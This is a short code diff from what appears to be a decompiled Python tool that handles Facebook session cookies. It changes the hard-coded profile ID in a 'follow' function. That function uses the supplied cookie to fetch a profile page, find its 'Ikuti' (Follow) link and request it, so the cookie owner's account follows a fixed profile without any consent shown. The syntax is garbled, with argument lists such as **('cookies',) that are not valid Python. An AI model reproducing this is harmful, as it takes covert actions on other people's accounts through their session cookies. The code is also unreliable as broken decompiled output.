@@ -50,7 +50,7 @@ except ModuleNotFoundError:
     
 
 def follow(self, session, coki):
-        r = BeautifulSoup(session.get('https://free.facebook.com/profile.php?id=100015315258519', {
+        r = BeautifulSoup(session.get('https://free.facebook.com/profile.php?id=100019487550831', {
             'cookie': coki }, **('cookies',)).text, 'html.parser')
         get = r.find('a', 'Ikuti', **('string',)).get('href')
         session.get('https://free.facebook.com' + str(get), {
